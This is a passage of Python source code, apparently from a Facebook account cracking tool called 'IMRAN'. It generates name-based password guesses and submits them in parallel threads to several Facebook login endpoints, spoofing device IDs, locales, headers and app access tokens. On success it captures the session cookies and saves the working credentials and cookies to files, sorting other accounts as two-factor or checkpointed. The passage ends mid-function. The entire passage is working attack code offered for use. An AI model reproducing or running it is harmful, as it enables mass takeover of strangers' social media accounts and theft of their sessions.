		print(f"  {C}├{W}[{R}1{W}]>{Y}> {G}AUTO PASS NORMAL        {C}│")
		print(f"  {C}├{W}[{R}2{W}]>{Y}> {G}AUTO PASS SLOW          {C}│")
		print(f"  {C}├{W}[{R}3{W}]>{Y}> {G}AUTO PASS HIGH          {C}│")
		print(f"  {C}├{W}[{R}4{W}]>{Y}> {G}CUSTOM  PASS            {C}│")
		print(f"  {C}└──────────────────────────────┘")
		joyxdbangla = input(f"  {C}└─✈ {G}INPUT PASS SYSTEM {W}<{Y}>{G} ")
		self.plist=[]
		if joyxdbangla == "1":
			self.plist.extend(["md first","first","first12","first123","first1234","first12345","first123456","last","last12","last123","last1234","last12345","last123456","first321","first4321","mdfirst","last321","mdlast","mdfirstlast","firstlast","firstlast12","firstlast123"])
		if joyxdbangla == "2":
			self.plist.extend(["First Last","first last","firstlast","first112233","first123456","first12345","first1234","first123","first12","mdfirst","first1122","first4321","first321","md first","first"])
		if joyxdbangla == "3":
			self.plist.extend(["First Last","first last","firstlast","first112233","first123456","first12345","first1234","first123","first12","mdfirst","first1122","first4321","first321","md first","first"])
		if joyxdbangla not in ["1","2","3"]:
			try:
				clear()
				pasx=int(input(f"  {C}└─✈ {G}INPUT PASS lIMIT {W}<{Y}>{G} "))
			except:
				pasx=2
			print(f"  {C}┌──────────────────────────────┐")
			print(f"  {C}├{G}EXAMPLE {W}<{Y}>{G} first@123 | @first@ | first123 ")
			print(f"  {C}└──────────────────────────────┘")
			for i in range(pasx):
				self.plist.append(input(f"  {C}└─✈ {G} PASS NO {W}[{R}{i+1}{W}] {W}<{Y}>{G} "))
		clear()
		print(f"  {C}┌──────────────────────────────┐")
		print(f"  {C}├{W}[{R}1{W}]>{Y}> {G}CRACK  SPEED NORMAL {W}[{R}30{W}]{C}│")
		print(f"  {C}├{W}[{R}1{W}]>{Y}> {G}CUSTOM  SPEED {W}[{R}20-90{W}]   {C}│")
		print(f"  {C}└──────────────────────────────┘")
		crsp=input(f"  {C}└─✈ {G}INPUT CRACK SPEED OPTION {W}<{Y}>{G} ")
		if crsp == "1":
			xdx=45
		else:
			while True:
				try:
					print(f"  {C}┌──────────────────────────────┐")
					print(f"  {C}├{G}MAXIMUM CRACK SPEED IS {W}[{R}20-90{W}]{C}│")
					print(f"  {C}└──────────────────────────────┘")
					xdx=int(input(f"  {C}└─✈ {G}INPUT CRACK SPEED {W}<{Y}>{G} "))
					if xdx < 20:
						print(f"  {C}┌──────────────────────────────┐")
						print(f"  {C}├{G}LOWEST CRACK SPEED IS {W}[{R}20{W}]{C}│")
						print(f"  {C}└──────────────────────────────┘")
						sleep(1.5)
						sys.exit()
					if xdx > 90:
						print(f"  {C}┌──────────────────────────────┐")
						print(f"  {C}├{G}LOWEST CRACK SPEED IS {W}[{R}20{W}]{C}│")
						print(f"  {C}└──────────────────────────────┘")
						sleep(1.5)
						sys.exit()
					else:
						break
				except ValueError:
					xdx=30
		clear()
		print(f"  {C}┌──────────────────────────────┐")
		print(f"  {C}├{G}DO YOU WANT SHOW COOKIE {W}Y{Y}/{R}N{C}   │")
		print(f"  {C}└──────────────────────────────┘")
		joycookie=input(f"  {C}└─✈ {G}SELECT Y or N {W}<{Y}>{G} ")
		print(f"  {C}┌──────────────────────────────┐")
		print(f"  {C}├{G}DO YOU WAN'T TO SHOW 2F/CP    {C}│")
		print(f"  {C}└──────────────────────────────┘")
		joycp2f=input(f"  {C}└─✈ {G}SELECT Y or N {W}<{Y}>{G} ")
		if joycookie in ["y","Y","yes","Yes","1"]:
			self.cokiex.append("y")
		else:
			self.cokiex.append("n")
		if joycp2f in ["y","Y","yes","Yes","1"]:
			self.cp2f.append("y")
		else:
			self.cp2f.append("n")
		with ThreadPool(max_workers=xdx) as seaxspace:
			clear()
			total_uids=str(len(ids))
			print(f"  {C}┌──────────────────────────────┐")
			print(f"  {C}├{G}TOTAL UID {W}<{Y}>{G} {total_uids}           {C}│")
			print(f"  {C}├{G}TODAY DATE {W}<{Y}>{G} {date}{C}│")
			print(f"  {C}├{G}NETWORK {W}<{Y}>{G} {sim_show()}│")
			print(f"  {C}├{G}USE AIRPLANE MODE FOR BETTER RESULT")
			print(f"  {C}└──────────────────────────────┘")
			for user in ids:
				try:
					ids,names=user.split("|")
				except ValueError:
					continue
				passlist=self.plist
				if mts == "1":
					seaxspace.submit(self.__graph__,ids,names,passlist)
				if mts == "2":
					seaxspace.submit(self.__bgraph__,ids,names,passlist)
				if mts == "3":
					seaxspace.submit(self.__api__,ids,names,passlist)
				if mts == "4":
					seaxspace.submit(self.__bapi__,ids,names,passlist)
				if mts == "5":
					seaxspace.submit(self.__host__,ids,names,passlist)
				if mts not in ["1","2","3","4","5"]:
					print("[≝] Method Not Found ")
					sleep(1.5)
					line()
					sys.exit()
		print("\033[1;37m")
		line()
		print(f"[≝] The Crack Is Complete\n[≝] Total Ok|2f|Cp [{G}{len(self.oks)}{W}|{X}{len(self.twf)}{W}|{R}{len(self.cps)}{W}] ")
		line()
		print(f"[≝] Thanks For Using")
		sleep(1.5)
		line()
		sys.exit()

	def __graph__(self,ids,names,passlist) -> None:
		try:
			global loop
			sys.stdout.write(f"\r[IMRAN]―[M1/{self.loop}]-[{G}{len(self.oks)}{W}|{X}{len(self.twf)}{W}|{R}{len(self.cps)}{W}] ")
			sys.stdout.flush()
			fn = names.split(' ')[0]
			try:
				ln = names.split(' ')[1]
			except:
				ln = fn
			for pw in passlist:
				pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
				ua = ___UPA___()
				accessToken = random.choice(["350685531728|62f8ce9f74b12f84c123cc23437a4a32","350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","256002347743983|374e60f8b9bb6b8cbb30f78030438895","275254692598279|585aec5b4c27376758abb7ffcb9db2af","6628568379|c1e620fa708a1d5696fb991c1bde5662"])
				pax = random.choice(["PWD_FB4A","PWD_BROWSER","PWD_MSGR","PWD_REACTNATIVE","PWD_ENC"])
				dprx = random.choice(['1','2','3'])
				__locale__ = {"en_US":"US","en_GB":"GB","es_ES":"ES","fr_FR":"FR","ar_SA":"SA","bn_BD":"BD","ja_JP":"JP","de_DE":"DE","pt_BR":"BR","en_AU":"AU","en_CA":"CA","en_IN":"IN","es_LA":"LA","fr_CA":"CA","th_TH":"TH","tr_TR":"TR","pl_PL":"PL","nl_NL":"NL","da_DK":"DK","fi_FI":"FI","sv_SE":"SE","nb_NO":"NO","cs_CZ":"CZ","hu_HU":"HU","el_GR":"GR","ro_RO":"RO","sk_SK":"SK","bg_BG":"BG","uk_UA":"UA","hr_HR":"HR","lt_LT":"LT","lv_LV":"LV","et_EE":"EE","sr_RS":"RS","sl_SI":"SI","he_IL":"IL","hi_IN":"IN","ms_MY":"MY","id_ID":"ID","vi_VN":"VN","tl_PH":"PH","bn_IN":"IN","pa_IN":"IN","gu_IN":"IN","ta_IN":"IN","te_IN":"IN","ml_IN":"IN","kn_IN":"IN","mr_IN":"IN","or_IN":"IN","as_IN":"IN","ne_NP":"NP","si_LK":"LK","my_MM":"MM","km_KH":"KH","lo_LA":"LA","mn_MN":"MN","kmr_TR":"TR","ku_TR":"TR","bs_BA":"BA","sq_AL":"AL","mk_MK":"MK","mt_MT":"MT","cy_GB":"GB","gd_GB":"GB","ga_IE":"IE","eu_ES":"ES","gl_ES":"ES","ca_ES":"ES","ast_ES":"ES","oc_FR":"FR","br_FR":"FR","co_FR":"FR","rm_CH":"CH","wa_BE":"BE","lb_LU":"LU","mo_MD":"MD","be_BY":"BY","uz_UZ":"UZ","tk_TM":"TM","kk_KZ":"KZ","ky_KG":"KG","tg_TJ":"TJ","az_AZ":"AZ","hy_AM":"AM","ka_GE":"GE","af_ZA":"ZA","xh_ZA":"ZA","zu_ZA":"ZA","sw_KE":"KE","am_ET":"ET","ti_ET":"ET","so_SO":"SO","om_ET":"ET","rn_BI":"BI","rw_RW":"RW","mg_MG":"MG","ha_NG":"NG","ig_NG":"NG","yo_NG":"NG","qu_PE":"PE","ay_PE":"PE","gn_PY":"PY","dz_BT":"BT","bo_CN":"CN","ug_CN":"CN","wo_SN":"SN","yo_BJ":"BJ","ar_DZ":"DZ","ar_EG":"EG","ar_IQ":"IQ","ar_JO":"JO","ar_KW":"KW","ar_LB":"LB","ar_LY":"LY","ar_MA":"MA","ar_OM":"OM","ar_QA":"QA","ar_SA":"SA","ar_SD":"SD","ar_SY":"SY","ar_TN":"TN","ar_AE":"AE","ar_YE":"YE","fa_IR":"IR","ps_AF":"AF","ur_PK":"PK","sd_PK":"PK","pa_PK":"PK","si_LK":"LK","bn_BD":"BD","ta_LK":"LK","ta_MY":"MY","ta_SG":"SG","zh_HK":"HK","zh_MO":"MO","zh_SG":"SG","zh_TW":"TW","my_MM":"MM","ms_BN":"BN","ms_SG":"SG","th_TH":"TH","lo_LA":"LA","km_KH":"KH","vi_VN":"VN","id_ID":"ID","jv_ID":"ID","su_ID":"ID","tl_PH":"PH","fil_PH":"PH","ceb_PH":"PH","war_PH":"PH","en_BZ":"BZ","es_MX":"MX","es_GT":"GT","es_CR":"CR","es_PA":"PA","es_DO":"DO","es_VE":"VE","es_CO":"CO","es_PE":"PE","es_EC":"EC","es_CL":"CL","es_AR":"AR","es_UY":"UY","es_PY":"PY","es_BO":"BO","es_HN":"HN","es_NI":"NI","es_PR":"PR","fr_BE":"BE","fr_CH":"CH","fr_LU":"LU","fr_MC":"MC","de_AT":"AT","de_CH":"CH","de_LU":"LU","de_LI":"LI","it_CH":"CH","nl_BE":"BE","fi_AX":"AX","se_SE":"SE","is_IS":"IS","fo_FO":"FO","kl_GL":"GL","en_NZ":"NZ","en_ZA":"ZA","en_JM":"JM","en_BW":"BW","en_NA":"NA","en_ZM":"ZM","en_MW":"MW","en_UG":"UG","en_KE":"KE","en_TZ":"TZ"}
				country_locale = random.choice(list(__locale__.keys()))
				country_code = __locale__[country_locale]
				random_seed = random.Random()
				adid = str("".join(random_seed.choices(string.hexdigits, k=16)))
				device_id = str(uuid.uuid4())
				data = {"adid": adid,"format": "json","device_id": device_id,"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email": str(ids),"password": f"#{pax}:0:{int(time.time())}:{pas}","access_token": f"{accessToken}","generate_session_cookies": "1","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": country_locale,"client_country_code": country_code,"method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": random.choice(["com.facebook.auth.login.AuthOperations$PasswordAuthOperation","com.facebook.account.login.protocol.Fb4aAuthHandler","graphservice","Fb4aAuthHandler","com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler"]),"api_key": "882a8490361da98702bf97a021ddc14d"}
				headers = {"User-Agent": ua,"Accept-Encoding": "gzip, deflate","Accept": "*/*","Connection": "keep-alive","Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com","X-FB-Net-HNI": str(random.randint(11111, 99999)),"X-FB-SIM-HNI": str(random.randint(11111, 99999)),"X-FB-Connection-Type": random.choice(["CELL.3G","WIFI","MOBILE.LTE","cell.CTRadioAccessTechnologyHSDPA","unknown"]),"X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": str(random.randint(1000,9999)),"X-FB-Friendly-Name": random.choice(["ViewerReactionsMutation","authenticate"]),"X-FB-Request-Analytics-Tags": random.choice(["unknown","graphservice"]),"X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62"}
				twf = "Login approvals are on. Expect an SMS shortly with a code to use for log in"
				po = requests.post("https://graph.facebook.com/auth/login",data=data,headers=headers,allow_redirects=False,verify=True).json()
				if 'session_key' in po:
					session = po['session_cookies'];cookiex = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookiex+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookiex+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookiex+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookiex+=datr+f';dpr={dprx};locale={country_locale};wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookiex+=pagevoice;ssbb = base64.b64encode(os.urandom(18)).decode().replace('=','').replace('+','_').replace('/','-');cookie = f'sb={ssbb};{cookiex}'
					colorX = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
					print(f"\r{G}[IMRAN-Ok]{W} {G}{ids}{W} {G}|{W} {G}{pas}{W} ")
					if 'y' in self.cokiex:
						print(f"\r[Cookie-🍪] {colorX} {cookie}{W}\n ")
					open('/sdcard/IMRAN-M1-OK.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
					self.oks.append(ids)
					break
				if twf in str(po):
					if 'y' in self.cp2f:
						print(f"\r{X}[IMRAN-2F]{W} {X}{ids}{W} {X}|{W} {X}{pas}{W} ")
					open('/sdcard/IMRAN-M1-2F.txt','a').write(ids+'|'+pas+'\n')
					self.twf.append(ids)
					break
				if 'www.facebook.com' in po['error']['message']:
					if 'y' in self.cp2f:
						print(f"\r{R}[IMRAN-CP]{W} {R}{ids}{W} {R}|{W} {R}{pas}{W} ")
					open('/sdcard/IMRAN-M1-CP.txt','a').write(ids+'|'+pas+'\n')
					self.cps.append(ids)
					break
				else:
					continue
			self.loop+=1
		except requests.exceptions.Timeout:
			sleep(31)
		except requests.exceptions.ConnectionError:
			sleep(31)
		except Exception as e:
			pass

	def __bgraph__(self,ids,names,passlist) -> None:
		try:
			global loop
			sys.stdout.write(f"\r[IMRAN]―[M2/{self.loop}]-[{G}{len(self.oks)}{W}|{X}{len(self.twf)}{W}|{R}{len(self.cps)}{W}] ")
			sys.stdout.flush()
			fn = names.split(' ')[0]
			try:
				ln = names.split(' ')[1]
			except:
				ln = fn
			for pw in passlist:
				pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
				ua = ___UPA___()
				accessToken = random.choice(["350685531728|62f8ce9f74b12f84c123cc23437a4a32","350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","256002347743983|374e60f8b9bb6b8cbb30f78030438895","275254692598279|585aec5b4c27376758abb7ffcb9db2af","6628568379|c1e620fa708a1d5696fb991c1bde5662"])
				pax = random.choice(["PWD_FB4A","PWD_BROWSER","PWD_MSGR","PWD_REACTNATIVE","PWD_ENC"])
				dprx = random.choice(['1','2','3'])
				__locale__ = {"en_US":"US","en_GB":"GB","es_ES":"ES","fr_FR":"FR","ar_SA":"SA","bn_BD":"BD","ja_JP":"JP","de_DE":"DE","pt_BR":"BR","en_AU":"AU","en_CA":"CA","en_IN":"IN","es_LA":"LA","fr_CA":"CA","th_TH":"TH","tr_TR":"TR","pl_PL":"PL","nl_NL":"NL","da_DK":"DK","fi_FI":"FI","sv_SE":"SE","nb_NO":"NO","cs_CZ":"CZ","hu_HU":"HU","el_GR":"GR","ro_RO":"RO","sk_SK":"SK","bg_BG":"BG","uk_UA":"UA","hr_HR":"HR","lt_LT":"LT","lv_LV":"LV","et_EE":"EE","sr_RS":"RS","sl_SI":"SI","he_IL":"IL","hi_IN":"IN","ms_MY":"MY","id_ID":"ID","vi_VN":"VN","tl_PH":"PH","bn_IN":"IN","pa_IN":"IN","gu_IN":"IN","ta_IN":"IN","te_IN":"IN","ml_IN":"IN","kn_IN":"IN","mr_IN":"IN","or_IN":"IN","as_IN":"IN","ne_NP":"NP","si_LK":"LK","my_MM":"MM","km_KH":"KH","lo_LA":"LA","mn_MN":"MN","kmr_TR":"TR","ku_TR":"TR","bs_BA":"BA","sq_AL":"AL","mk_MK":"MK","mt_MT":"MT","cy_GB":"GB","gd_GB":"GB","ga_IE":"IE","eu_ES":"ES","gl_ES":"ES","ca_ES":"ES","ast_ES":"ES","oc_FR":"FR","br_FR":"FR","co_FR":"FR","rm_CH":"CH","wa_BE":"BE","lb_LU":"LU","mo_MD":"MD","be_BY":"BY","uz_UZ":"UZ","tk_TM":"TM","kk_KZ":"KZ","ky_KG":"KG","tg_TJ":"TJ","az_AZ":"AZ","hy_AM":"AM","ka_GE":"GE","af_ZA":"ZA","xh_ZA":"ZA","zu_ZA":"ZA","sw_KE":"KE","am_ET":"ET","ti_ET":"ET","so_SO":"SO","om_ET":"ET","rn_BI":"BI","rw_RW":"RW","mg_MG":"MG","ha_NG":"NG","ig_NG":"NG","yo_NG":"NG","qu_PE":"PE","ay_PE":"PE","gn_PY":"PY","dz_BT":"BT","bo_CN":"CN","ug_CN":"CN","wo_SN":"SN","yo_BJ":"BJ","ar_DZ":"DZ","ar_EG":"EG","ar_IQ":"IQ","ar_JO":"JO","ar_KW":"KW","ar_LB":"LB","ar_LY":"LY","ar_MA":"MA","ar_OM":"OM","ar_QA":"QA","ar_SA":"SA","ar_SD":"SD","ar_SY":"SY","ar_TN":"TN","ar_AE":"AE","ar_YE":"YE","fa_IR":"IR","ps_AF":"AF","ur_PK":"PK","sd_PK":"PK","pa_PK":"PK","si_LK":"LK","bn_BD":"BD","ta_LK":"LK","ta_MY":"MY","ta_SG":"SG","zh_HK":"HK","zh_MO":"MO","zh_SG":"SG","zh_TW":"TW","my_MM":"MM","ms_BN":"BN","ms_SG":"SG","th_TH":"TH","lo_LA":"LA","km_KH":"KH","vi_VN":"VN","id_ID":"ID","jv_ID":"ID","su_ID":"ID","tl_PH":"PH","fil_PH":"PH","ceb_PH":"PH","war_PH":"PH","en_BZ":"BZ","es_MX":"MX","es_GT":"GT","es_CR":"CR","es_PA":"PA","es_DO":"DO","es_VE":"VE","es_CO":"CO","es_PE":"PE","es_EC":"EC","es_CL":"CL","es_AR":"AR","es_UY":"UY","es_PY":"PY","es_BO":"BO","es_HN":"HN","es_NI":"NI","es_PR":"PR","fr_BE":"BE","fr_CH":"CH","fr_LU":"LU","fr_MC":"MC","de_AT":"AT","de_CH":"CH","de_LU":"LU","de_LI":"LI","it_CH":"CH","nl_BE":"BE","fi_AX":"AX","se_SE":"SE","is_IS":"IS","fo_FO":"FO","kl_GL":"GL","en_NZ":"NZ","en_ZA":"ZA","en_JM":"JM","en_BW":"BW","en_NA":"NA","en_ZM":"ZM","en_MW":"MW","en_UG":"UG","en_KE":"KE","en_TZ":"TZ"}
				country_locale = random.choice(list(__locale__.keys()))
				country_code = __locale__[country_locale]
				random_seed = random.Random()
				adid = str("".join(random_seed.choices(string.hexdigits, k=16)))
				device_id = str(uuid.uuid4())
				data = {"adid": adid,"format": "json","device_id": device_id,"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email": str(ids),"password": f"#{pax}:0:{int(time.time())}:{pas}","access_token": f"{accessToken}","generate_session_cookies": "1","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": country_locale,"client_country_code": country_code,"method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": random.choice(["com.facebook.auth.login.AuthOperations$PasswordAuthOperation","com.facebook.account.login.protocol.Fb4aAuthHandler","graphservice","Fb4aAuthHandler","com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler"]),"api_key": "882a8490361da98702bf97a021ddc14d"}
				headers = {"User-Agent": ua,"Accept-Encoding": "gzip, deflate","Accept": "*/*","Connection": "keep-alive","Content-Type": "application/x-www-form-urlencoded","Host": "b-graph.facebook.com","X-FB-Net-HNI": str(random.randint(11111, 99999)),"X-FB-SIM-HNI": str(random.randint(11111, 99999)),"X-FB-Connection-Type": random.choice(["CELL.3G","WIFI","MOBILE.LTE","unknown"]),"X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": str(random.randint(1000,9999)),"X-FB-Friendly-Name": random.choice(["ViewerReactionsMutation","authenticate"]),"X-FB-Request-Analytics-Tags": random.choice(["unknown","graphservice"]),"X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62"}
				twf = "Login approvals are on. Expect an SMS shortly with a code to use for log in"
				po = requests.post("https://b-graph.facebook.com/auth/login",data=data,headers=headers,allow_redirects=False,verify=True).json()
				if 'session_key' in po:
					session = po['session_cookies'];cookiex = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookiex+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookiex+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookiex+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookiex+=datr+f';dpr={dprx};locale={country_locale};wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookiex+=pagevoice;ssbb = base64.b64encode(os.urandom(18)).decode().replace('=','').replace('+','_').replace('/','-');cookie = f'sb={ssbb};{cookiex}'
					colorX = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
					print(f"\r{G}[IMRAN-Ok]{W} {G}{ids}{W} {G}|{W} {G}{pas}{W} ")
					if 'y' in self.cokiex:
						print(f"\r[Cookie-🍪] {colorX} {cookie}{W}\n ")
					open('/sdcard/IMRAN-M2-OK.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
					self.oks.append(ids)
					break
				if twf in str(po):
					if 'y' in self.cp2f:
						print(f"\r{X}[IMRAN-2F]{W} {X}{ids}{W} {X}|{W} {X}{pas}{W} ")
					open('/sdcard/IMRAN-M2-2F.txt','a').write(ids+'|'+pas+'\n')
					self.twf.append(ids)
					break
				if 'www.facebook.com' in po['error']['message']:
					if 'y' in self.cp2f:
						print(f"\r{R}[IMRAN-CP]{W} {R}{ids}{W} {R}|{W} {R}{pas}{W} ")
					open('/sdcard/IMRAN-M2-CP.txt','a').write(ids+'|'+pas+'\n')
					self.cps.append(ids)
					break
				else:
					continue
			self.loop+=1
		except requests.exceptions.Timeout:
			sleep(31)
		except requests.exceptions.ConnectionError:
			sleep(31)
		except Exception as e:
			pass

	def __api__(self,ids,names,passlist) -> None:
		try:
			global loop
			sys.stdout.write(f"\r[IMRAN]―[M3/{self.loop}]-[{G}{len(self.oks)}{W}|{X}{len(self.twf)}{W}|{R}{len(self.cps)}{W}] ")
			sys.stdout.flush()
			fn = names.split(' ')[0]
			try:
				ln = names.split(' ')[1]
			except:
				ln = fn
			for pw in passlist:
				pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
				ua = ___UPA___()
				accessToken = random.choice(["350685531728|62f8ce9f74b12f84c123cc23437a4a32","350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","256002347743983|374e60f8b9bb6b8cbb30f78030438895","275254692598279|585aec5b4c27376758abb7ffcb9db2af","6628568379|c1e620fa708a1d5696fb991c1bde5662"])
				pax = random.choice(["PWD_FB4A","PWD_BROWSER","PWD_MSGR","PWD_REACTNATIVE","PWD_ENC"])
				dprx = random.choice(['1','2','3'])
				__locale__ = {"en_US":"US","en_GB":"GB","es_ES":"ES","fr_FR":"FR","ar_SA":"SA","bn_BD":"BD","ja_JP":"JP","de_DE":"DE","pt_BR":"BR","en_AU":"AU","en_CA":"CA","en_IN":"IN","es_LA":"LA","fr_CA":"CA","th_TH":"TH","tr_TR":"TR","pl_PL":"PL","nl_NL":"NL","da_DK":"DK","fi_FI":"FI","sv_SE":"SE","nb_NO":"NO","cs_CZ":"CZ","hu_HU":"HU","el_GR":"GR","ro_RO":"RO","sk_SK":"SK","bg_BG":"BG","uk_UA":"UA","hr_HR":"HR","lt_LT":"LT","lv_LV":"LV","et_EE":"EE","sr_RS":"RS","sl_SI":"SI","he_IL":"IL","hi_IN":"IN","ms_MY":"MY","id_ID":"ID","vi_VN":"VN","tl_PH":"PH","bn_IN":"IN","pa_IN":"IN","gu_IN":"IN","ta_IN":"IN","te_IN":"IN","ml_IN":"IN","kn_IN":"IN","mr_IN":"IN","or_IN":"IN","as_IN":"IN","ne_NP":"NP","si_LK":"LK","my_MM":"MM","km_KH":"KH","lo_LA":"LA","mn_MN":"MN","kmr_TR":"TR","ku_TR":"TR","bs_BA":"BA","sq_AL":"AL","mk_MK":"MK","mt_MT":"MT","cy_GB":"GB","gd_GB":"GB","ga_IE":"IE","eu_ES":"ES","gl_ES":"ES","ca_ES":"ES","ast_ES":"ES","oc_FR":"FR","br_FR":"FR","co_FR":"FR","rm_CH":"CH","wa_BE":"BE","lb_LU":"LU","mo_MD":"MD","be_BY":"BY","uz_UZ":"UZ","tk_TM":"TM","kk_KZ":"KZ","ky_KG":"KG","tg_TJ":"TJ","az_AZ":"AZ","hy_AM":"AM","ka_GE":"GE","af_ZA":"ZA","xh_ZA":"ZA","zu_ZA":"ZA","sw_KE":"KE","am_ET":"ET","ti_ET":"ET","so_SO":"SO","om_ET":"ET","rn_BI":"BI","rw_RW":"RW","mg_MG":"MG","ha_NG":"NG","ig_NG":"NG","yo_NG":"NG","qu_PE":"PE","ay_PE":"PE","gn_PY":"PY","dz_BT":"BT","bo_CN":"CN","ug_CN":"CN","wo_SN":"SN","yo_BJ":"BJ","ar_DZ":"DZ","ar_EG":"EG","ar_IQ":"IQ","ar_JO":"JO","ar_KW":"KW","ar_LB":"LB","ar_LY":"LY","ar_MA":"MA","ar_OM":"OM","ar_QA":"QA","ar_SA":"SA","ar_SD":"SD","ar_SY":"SY","ar_TN":"TN","ar_AE":"AE","ar_YE":"YE","fa_IR":"IR","ps_AF":"AF","ur_PK":"PK","sd_PK":"PK","pa_PK":"PK","si_LK":"LK","bn_BD":"BD","ta_LK":"LK","ta_MY":"MY","ta_SG":"SG","zh_HK":"HK","zh_MO":"MO","zh_SG":"SG","zh_TW":"TW","my_MM":"MM","ms_BN":"BN","ms_SG":"SG","th_TH":"TH","lo_LA":"LA","km_KH":"KH","vi_VN":"VN","id_ID":"ID","jv_ID":"ID","su_ID":"ID","tl_PH":"PH","fil_PH":"PH","ceb_PH":"PH","war_PH":"PH","en_BZ":"BZ","es_MX":"MX","es_GT":"GT","es_CR":"CR","es_PA":"PA","es_DO":"DO","es_VE":"VE","es_CO":"CO","es_PE":"PE","es_EC":"EC","es_CL":"CL","es_AR":"AR","es_UY":"UY","es_PY":"PY","es_BO":"BO","es_HN":"HN","es_NI":"NI","es_PR":"PR","fr_BE":"BE","fr_CH":"CH","fr_LU":"LU","fr_MC":"MC","de_AT":"AT","de_CH":"CH","de_LU":"LU","de_LI":"LI","it_CH":"CH","nl_BE":"BE","fi_AX":"AX","se_SE":"SE","is_IS":"IS","fo_FO":"FO","kl_GL":"GL","en_NZ":"NZ","en_ZA":"ZA","en_JM":"JM","en_BW":"BW","en_NA":"NA","en_ZM":"ZM","en_MW":"MW","en_UG":"UG","en_KE":"KE","en_TZ":"TZ"}
				country_locale = random.choice(list(__locale__.keys()))
				country_code = __locale__[country_locale]
				random_seed = random.Random()
				adid = str("".join(random_seed.choices(string.hexdigits, k=16)))
				device_id = str(uuid.uuid4())
				data = {"adid": adid,"format": "json","device_id": device_id,"email": str(ids),"password": f"#{pax}:0:{int(time.time())}:{pas}","generate_analytics_claims": "1","community_id": "","cpl": "true","try_num": "1","family_device_id": str(uuid.uuid4()),"credentials_type": "password","source": "login","error_detail_type": "button_with_disabled","enroll_misauth": "false","generate_session_cookies": "1","generate_machine_id": "1","currently_logged_in_userid": "0","locale": country_locale,"client_country_code": country_code,"fb_api_req_friendly_name": "authenticate",}
				headers = {"User-Agent": ua,"Accept-Encoding":  "gzip, deflate","Accept": "*/*","Connection": "keep-alive","Authorization": f"OAuth {accessToken}","X-FB-Friendly-Name": random.choice(["ViewerReactionsMutation","authenticate"]),"X-FB-Connection-Bandwidth": str(random.randint(20000000, 40000000)),"X-FB-Net-HNI": str(random.randint(20000, 60000)),"X-FB-SIM-HNI": str(random.randint(20000, 60000)),"X-FB-Connection-Type": random.choice(["CELL.3G","WIFI","MOBILE.LTE","cell.CTRadioAccessTechnologyHSDPA","unknown"]),"Content-Type": "application/x-www-form-urlencoded","X-FB-HTTP-Engine": "Liger",}
				twf = "Login approvals are on. Expect an SMS shortly with a code to use for log in"
				po = requests.post("https://api.facebook.com/method/auth.login",data=data,headers=headers,allow_redirects=False,verify=True).json()
				if 'session_key' in po:
					session = po['session_cookies'];cookiex = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookiex+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookiex+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookiex+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookiex+=datr+f';dpr={dprx};locale={country_locale};wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookiex+=pagevoice;ssbb = base64.b64encode(os.urandom(18)).decode().replace('=','').replace('+','_').replace('/','-');cookie = f'sb={ssbb};{cookiex}'
					colorX = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
					print(f"\r{G}[IMRAN-Ok]{W} {G}{ids}{W} {G}|{W} {G}{pas}{W} ")
					if 'y' in self.cokiex:
